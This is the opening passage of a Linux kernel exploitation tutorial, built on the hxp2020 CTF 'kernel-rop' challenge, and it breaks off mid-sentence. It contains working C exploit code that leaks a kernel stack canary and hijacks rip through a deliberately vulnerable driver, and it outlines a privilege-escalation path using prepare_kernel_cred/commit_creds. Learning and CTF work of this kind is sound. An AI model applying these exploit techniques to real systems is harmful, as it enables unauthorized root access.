full_description = '''Exploitation Learning Linux kernel exploitation - Part 1 - Laying the groundwork Published 1 Mar 2022 39 min read By 0x434b Table fo contents Disclaimer: This post will cover basic steps to accomplish a privilege escalation based on a vulnerable driver. The basis for this introduction will be a challenge from the hxp2020 CTF called "kernel-rop". There's (obviously) write-ups for this floating around the net (check references) already and as it turns out this exact challenge has been taken apart in depth by (ChrisTheCoolHut and @_lkmidas), for part two I'll prepare a less prominent challenge or ignore those CTF challenges completely... So, this here very likely won't include a ton of novelty compared to what's out there already. However, that's not the intention behind this post. It's just a way for me to persist the things I learned during research and along the way to solving this one. Another reason for this particular CTF challenge is its simplicity while also being built around a fairly recent kernel. A perfect training environment :)!With that out of the way, let's get right into it. The primary goal for kernel pwning is unlike for user land exploitation to not directly spawn a shell but abuse the fact that we're having control of vulnerable kernel code that we hope to abuse to elevate privileges in a system. Spawning a shell only comes after, at least in your typical CTF-style scenarios. Sometimes having an arbitrary read-write primitive may already be enough to exfiltrate sensitive information or overwrite security critical sections.InitThe situation we're presented with is straightforward:Initial setup as intended by the authors of the challengeThe environment to be exploited has a full set of mitigations enabled:Kernel ASLR - Similar to user land ASLRSMEP/SMAP - Marks all userland pages as non RWX when execution happens in kernel landKPTI - Separates user land and kernel land page tables all together (There are a few more details here that I omitted for brevity, check here for more info).Luckily, the environment is fully under our control, so for testing purposes we can toggle the mitigations to make our life a tad easier for the exploit development process :)! Furthermore, we can see that the provided file system initramfs.cpio.gz is supplied in a compressed manner, so when we want to include our exploit we would need to unpack the file system, place our payload and pack it again. This is tedious, even more so in development cycles of an exploit. Having convenient scripts for these steps helps a lot.#!/bin/bash # Decompress a .cpio.gz packed file system mkdir initramfs pushd . && pushd initramfs cp ../initramfs.cpio.gz . gzip -dc initramfs.cpio.gz | cpio -idm &>/dev/null && rm initramfs.cpio.gz popd#!/bin/bash # Compress initramfs with the included statically linked exploit in=$1 out=$(echo $in | awk '{ print substr( $0, 1, length($0)-2 ) }') gcc $in -static -o $out || exit 255 mv $out initramfs pushd . && pushd initramfs find . -print0 | cpio --null --format=newc -o 2>/dev/null | gzip -9 > ../initramfs.cpio.gz popdReconThe two things we should (or have to) do first are unpacking the file system and extracting vmlinuz into a vmlinux. For the first one, we can just use gunzip and cpio to extract this archive. When done, we're presented with a basic file system structure:Directory tree of the challengeThere's not much unusual going on, except the obvious kernel driver called hackme.ko. As for the latter matter of extracting a vmlinuz⇾vmlinux, there's already a nice script for that. Getting it and running it gives us a result in seconds:Comparisons of vmlinuz ⇿ vmlinuxWith that out of the way, we're set to start our exploitation journey. Let's quickly sift through the kernel driver hackme.ko and see what we're presented with. Loading it in a disassembler reveals that we only have a handful of functions:Available functions in the vulnerable driverhackme_release, hackme_open, hackme_init, and hackme_exit are mostly uninteresting (at least for this challenge) as they're only a necessary evil to (de-)register the kernel module and properly initialize it. That leaves us with only hackme_write and hackme_read. As for the hackme_read function that allows reading from /dev/hackme it looks as follows:Disassembly graph of hackme_read I found the disassembly here to be a tad confusing at first, at least in terms of how the __memcpy has been set up. Hence, I rewrote the disassembly into better readable C. Essentially, what is happening here is the following:int hackme_buf[0x1000]; // 1 size_t hackme_read(file *f, char *data, size_t size, size_t *off) { // __fentry__ stuff omitted, as it's ftrace related int tmp[32]; // 2 OOB-R void *res = memcpy(hackme_buf, tmp, size); // Useless check against OOB-R if (size > 0x1000) { printk(KERN_WARNING "Buffer overflow detected (%d < %lu)!\n", 4096LL, len); BUG(); } // 3 Some sanity checks before writing the whole buffer ... // that is user controlled in size back to userland. // This is a leak! __check_object_size(hackme_buf, size, data); unsigned long written = copy_to_user(data, hackme_buf, size); if(written) { return size; } return -1; }Hand decompiled C code of hackme_readThe code should be pretty self-explanatory, but the gist is that we're writing a user-controlled amount of data from a small fixed sized buffer (tmp) in the large hackme_buf, which we later return to the user. After reading data from tmp we do have a sanity check of some sort that checks whether our requested amount is less than 0x1000 bytes. With the buffer being read from only being 0x80 bytes large that's rather useless. This results in us easily being able to read out-of-bounds here. However, following that, we have a more strict sanity check in __check_object_size that verifies 3 things:Validate that the pointer in argument one is not a bogus address,that it's a known-safe heap or stack object, and that it does not reside in kernel textWe check all of these 3 boxes with ease, so as a result, the requested data is written back to us into user land, and we got ourselves a sweet opportunity for a memory leak! The hackme_write counterpart is semantically identical, with the difference of allowing us as an attacker to send data to the driver:Analogous to hackme_read this is hackme_writeI'll leave it to you to translate this code snippet to C-equivalent source code. An important note here though is that since the hackme_write function is semantically the same, it does not give us an out-of-bounds read, but an (almost arbitrary large) out-of-bounds write as we're writing user controlled data in the very constraint tmp buffer here! With that, we already have identified our primitives for this challenge.Baby steps - ret2usrWe've seen that for this challenge we're running a fairly recent kernel with all common mitigations enabled. To test the waters, we're going to modify the execution environment two-fold:Disable all mitigations to craft a basic return to user style exploit to get familiar with the driver by modifying the run.sh by changing the "-append" parameter to -append "console=ttyS0 nosmep nosmap nopti nokaslr quiet panic=1". These options seem to also override the +smep,+smap options at the -cpu option, so we don't have to bother changing these.Modify the file system to drop us into a root shell. This may seem counterintuitive at first, but it allows us to freely move around the file system and e.g. read from /proc/kallsyms to get an idea where kernel symbols are located. When we're confident in our exploit, we will remove this little "hack" and test our exploit as a normal user. The modification for this will happen in etc/initd/rcS where we will append the following line setuidgid 0 /bin/sh.Next, recall that strategy-wise kernel exploitation in general aims not at spawning a shell first thing (what good would a shell for a non-root user do anyway), but at elevating privileges to the highest possible level first. However, the general idea of how to approach this e.g. via ROP applies equally to user land and kernel land with only minor differences. First things first, though. We saw in our static analysis that we have a nice memory leak in the hackme_read function. Let's set up our "exploit" and see what we can get back from the driver:#include <fcntl.h> #include <stdbool.h> #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define formatBool(b) ((b) ? "true" : "false") char *VULN_DRV = "/dev/hackme"; int64_t global_fd; uint64_t cookie; uint8_t cookie_off; void open_dev() { global_fd = open(VULN_DRV, O_RDWR); if (global_fd < 0) { printf("[!] Failed to open %s\n", VULN_DRV); exit(-1); } else { printf("[+] Successfully opened %s\n", VULN_DRV); } } bool is_cookie(const char* str) { uint8_t in_len = strlen(str); if (in_len < 18) { return false; } char prefix[7] = "0xffff\0"; char suffix[3] = "00\0"; return ( (!strncmp(str, prefix, strlen(prefix) - 1) == 0) && (strncmp(str + in_len - strlen(suffix), suffix, strlen(suffix) - 1) == 0)); } void leak_cookie() { uint8_t sz = 40; uint64_t leak[sz]; printf("[*] Attempting to leak up tp %d bytes\n", sizeof(leak)); uint64_t data = read(global_fd, leak, sizeof(leak)); puts("[*] Searching leak..."); for (uint8_t i = 0; i < sz; i++) { char cookie_str[18]; sprintf(cookie_str, "%#02lx", leak[i]); cookie_str[18] = '\0'; printf("\t--> %d: leak + 0x%x\t: %s\n", i, sizeof(leak[0]) * i, cookie_str); if(!cookie && is_cookie(cookie_str) && i > 2) { printf("[+] Found stack canary: %s @ idx %d\n", cookie_str, i); cookie_off = i; cookie = leak[cookie_off]; } } if(!cookie) { puts("[!] Failed to leak stack cookie!"); exit(-1); } } int main(int argc, char** argv) { open_dev(); leak_cookie(); }First exploit code to leak data from the kernelThe above code already gives it away, we're reading 320 bytes, which is reading 0xc0 bytes past the tmp buffer. Adding the exploit to the file system, starting the environment (./run.sh) and executing the exploit gives us back plenty of data, including an evident looking stack canary at index 2, 16, and 30:An example leakThe one at index 2 seems weird as this should still be in bounds. Maybe since tmp is not properly initialized, the system just decides to leave it with uninitialized data, which happens to be the kernel stack canary for whatever reason (if you know better LMK!). Anyhow, we found out the hard way that a kernel stack canary is in place regardless of all the disabled mitigations. Then again, we were able to leak it first thing here at a sensible offset of 17 * 8 bytes (0x88), which is located just past the tmp buffer when using the one at index 16.The next step would be testing if we can take control over rip when writing to the vulnerable driver, since we know the buffer size to fill, the canary, and its offset that sounds doable. We're going to add a function that creates a payload, which inserts the stack canary at the correct offset, which we found just earlier. In addition to that, we will add three dummy values, which when looking at the function epilogue of hackme_write earlier are the three registers rbx, r12 (IDA named it data), andrbp. Analogously, we can observe the same pattern of popping these three registers in the function epilogue in hackme_read. This is a noticeable difference to user land exploitation. We need to compensate for these three pop instructions before being able to overwrite the return address:void open_dev() { // As before }; void leak_cookie() { // As before } void write_ret() { uint8_t sz = 50; uint64_t payload[sz]; payload[cookie_off++] = cookie; payload[cookie_off++] = 0x0; payload[cookie_off++] = 0x0; payload[cookie_off++] = 0x0; payload[cookie_off++] = 0x4141414141414141; // return address uint64_t data = write(global_fd, payload, sizeof(payload)); puts("[!] If you can read this we failed the mission :("); } int main(int argc, char** argv) { open_dev(); leak_cookie(); write_ret(); }code to take control over ripRunning this modified version leaves us with:PoC for rip controlThis confirms we have (so far, without any mitigations, except kernel stack canaries) full control over rip. This enables us to construct a proper "ret2usr" attack. To aim for such an exploit strategy when targeting the kernel, we have to consider a couple of different gadgets compared to how we'd tackle this scenario in user land. Recall again that we hope to elevate our privileges. There are two prominent candidates for setting up exactly that scenario, when already having control over rip:prepare_kernel_cred() - This function can be used to prepare a set of credentials for a kernel service or even better, which fits our use case perfectly, it can be used to override a task's own credentials so that work can be done on behalf of that task that requires a different subjective context. This sounds rather convoluted, but it essentially means, that when we're able to call this we can have a fresh set of credentials back. What's even better is that if we supply 0 as an argument, our returned arguments will have no group association and full capabilities, which means full on root privileges!commit_creds() - This function is prepare_kernel_cred()'s best friend, as calling this one is necessary to install new credentials upon the currently running task and effectively overriding the old ones. With these two, elevating privileges sounds straightforward!So besides these two functions which we may be able to build a ROP chain around now, how would we continue after having elevated our privileges? We're still executing in the kernel context. So assuming we want to drop a (privileged) shell, we have to return to user land eventually. To do exactly that, there's another pair, this time on the ROP gadget side, that allows us to switch contexts: swapgs with either iretq or sysretq:swapgs - This instruction is intended to set up context switching, or more particular to switch register context from a user land to kernel land and vice-versa. Specifically, swapgs swaps the value of the gs register so that it refers to either a memory location in the running application, or a location in the kernel’s space. This is a requirement for switching contexts!iretq/sysretq - Either of these can be used to perform the actual context switch between user land and kernel land. iretq has a straightforward setup. It only requires five user land register values in the following order rip, cs, rflags, sp, ss. So, we have to push them to the stack in the reverse order right before executing iretq. sysretq on the other hand, when executed moves the value in rcx to rip, which means we have to set up our return address in such a way that it's located in rcx. Additionally, it also moves rflags to r11, which may require additional handling. Finally, sysretq expects the value in rip to be in canonical form, which basically means that bits 48 through 63 of that value must be identical to bit 47 (compare sign extension). If t'''
